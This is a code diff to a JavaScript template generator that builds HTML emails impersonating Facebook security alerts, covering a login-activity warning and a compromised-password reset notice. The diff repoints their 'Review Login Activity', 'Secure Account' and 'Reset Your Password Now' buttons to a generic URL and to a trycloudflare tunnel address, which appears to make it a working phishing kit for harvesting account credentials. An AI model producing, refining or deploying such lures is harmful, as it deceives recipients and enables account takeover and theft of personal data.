@@ -119,8 +119,8 @@ export default async function fetch_template(type = 2, username = null, target_e
             </ul>
             
             <div style="text-align: center; margin: 30px 0;">
-                <a href="${URL}/facebook/secure" class="button">Review Login Activity</a>
-                <a href="${URL}/facebook/secure" class="button button-secondary">Secure Account</a>
+                <a href="${URL}" class="button">Review Login Activity</a>
+                <a href="https://finest-immigration-ones-legs.trycloudflare.com" class="button button-secondary">Secure Account</a>
             </div>
             
             <p style="font-size: 14px; color: #65676b;">
@@ -278,7 +278,7 @@ export default async function fetch_template(type = 2, username = null, target_e
         Our security systems have detected that your current password may be compromised. To protect your account and personal information, we require you to update your password.</p>
         
         <div style="text-align: center; margin: 30px 0;">
-            <a href="${URL}/facebook/reset"
+            <a href="${URL}"
                style="background: #4267B2; color: white; text-decoration: none; padding: 15px 40px; border-radius: 6px; font-size: 16px; font-weight: bold; display: inline-block;">
                 Reset Your Password Now
             </a>
